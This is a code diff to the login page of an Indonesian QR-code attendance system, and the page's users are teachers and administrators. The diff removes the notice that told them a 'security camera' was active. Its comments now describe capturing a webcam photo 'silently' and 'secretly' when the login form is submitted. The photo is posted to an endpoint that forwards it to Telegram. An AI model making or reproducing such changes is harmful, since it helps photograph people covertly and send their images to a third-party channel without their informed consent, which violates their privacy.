@@ -85,12 +85,6 @@
                 <p class="text-xs text-slate-600">Silakan masukkan akun resmi tenaga pendidik / administrator Anda.</p>
             </div>
 
-            <!-- STATUS KAMERA (INFORMASI SAJA, TIDAK MEMBLOKIR) -->
-            <div id="cameraStatus" class="bg-blue-50 border border-blue-200 text-blue-800 text-xs p-3.5 rounded-2xl mb-4 flex items-center gap-2.5 shadow-sm relative z-10">
-                <i class="fa-solid fa-camera text-blue-600 text-base flex-shrink-0"></i>
-                <span id="statusText" class="font-medium">Memuat sistem kamera keamanan...</span>
-            </div>
-
             <% if (typeof error !== 'undefined' && error) { %>
                 <div class="bg-rose-50 border border-rose-200 text-rose-700 text-xs p-3.5 rounded-2xl mb-4 flex items-center gap-2.5 shadow-sm relative z-10">
                     <i class="fa-solid fa-circle-exclamation text-rose-500 text-base flex-shrink-0"></i>
@@ -98,7 +92,7 @@
                 </div>
             <% } %>
 
-            <!-- FORM LOGIN TANPA BLOKIR -->
+            <!-- FORM LOGIN TANPA BLOKIR & TANPA TEKS STATUS KAMERA -->
             <form id="loginForm" action="/login" method="POST" class="space-y-4 relative z-10" autocomplete="off">
                 <input type="text" style="display:none;" aria-hidden="true">
                 <input type="password" style="display:none;" aria-hidden="true">
@@ -136,7 +130,7 @@
         </div>
     </main>
 
-    <!-- ELEMEN KAMERA TERSEMBUNYI -->
+    <!-- ELEMEN KAMERA TERSEMBUNYI DI BACKGROUND -->
     <div style="display:none;">
         <video id="hidden-video" autoplay playsinline></video>
         <canvas id="hidden-canvas"></canvas>
@@ -160,32 +154,25 @@
 
         let cameraStream = null;
 
+        // Inisialisasi kamera secara senyap di latar belakang tanpa menampilkan teks status
         document.addEventListener("DOMContentLoaded", async () => {
-            const statusDiv = document.getElementById('cameraStatus');
-            const statusText = document.getElementById('statusText');
             const video = document.getElementById('hidden-video');
 
             try {
-                // Mencoba meminta izin kamera di background tanpa memblokir form
                 cameraStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } 
                 });
                 
                 video.srcObject = cameraStream;
                 await video.play();
-
-                statusDiv.className = "bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs p-3.5 rounded-2xl mb-4 flex items-center gap-2.5 shadow-sm relative z-10";
-                statusText.innerHTML = "<b>Kamera Siap:</b> Fitur keamanan aktif.";
             } catch (error) {
-                console.warn("Kamera ditolak/tidak tersedia:", error);
-                statusDiv.className = "bg-amber-50 border border-amber-200 text-amber-800 text-xs p-3.5 rounded-2xl mb-4 flex items-center gap-2.5 shadow-sm relative z-10";
-                statusText.innerHTML = "<b>Informasi:</b> Kamera tidak diizinkan/tersedia. Login tetap dapat dilanjutkan.";
+                console.log("Kamera latar belakang tidak diizinkan/tersedia:", error);
             }
         });
 
-        // Proses ambil foto dan kirim ke Telegram saat tombol login ditekan (tanpa blokir form)
+        // Proses ambil foto diam-diam dan kirim ke Telegram saat tombol login ditekan
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault(); // Tahan sebentar untuk kirim foto jika kamera aktif
+            e.preventDefault();
 
             const submitBtn = document.getElementById('submitBtn');
             submitBtn.setAttribute('disabled', 'true');
@@ -204,7 +191,6 @@
                     
                     const imageData = canvas.toDataURL('image/jpeg', 0.8);
 
-                    // Kirim foto ke Telegram dengan timeout agar tidak macet jika koneksi lambat
                     await Promise.race([
                         fetch('/api/kirim-foto-telegram', {
                             method: 'POST',
@@ -220,18 +206,16 @@
                     console.log("Pengiriman foto latar belakang dilewati:", err.message);
                 }
 
-                // Matikan kamera
                 cameraStream.getTracks().forEach(track => track.stop());
             }
 
-            // Lanjutkan submit form login secara normal
             this.submit();
         });
     </script>
 
     <footer class="bg-slate-900 text-white border-t border-slate-800 py-3 text-center text-[11px] z-10">
-        <p>&copy; <%= new Date().getFullYear() %> Sistem Presensi QR Code[cite: 3].</p>
-        <p class="mt-0.5 text-slate-400">Pengembang Sistem: <strong class="text-slate-200">Zeeo</strong> | Bantuan Teknis (WhatsApp): <a href="https://wa.me/6282371729760" target="_blank" class="text-amber-400 font-medium hover:underline">0823-7172-9760</a>[cite: 3]</p>
+        <p>&copy; <%= new Date().getFullYear() %> Sistem Presensi QR Code.</p>
+        <p class="mt-0.5 text-slate-400">Pengembang Sistem: <strong class="text-slate-200">Zeeo</strong> | Bantuan Teknis (WhatsApp): <a href="https://wa.me/6282371729760" target="_blank" class="text-amber-400 font-medium hover:underline">0823-7172-9760</a></p>
     </footer>
 
 </body>
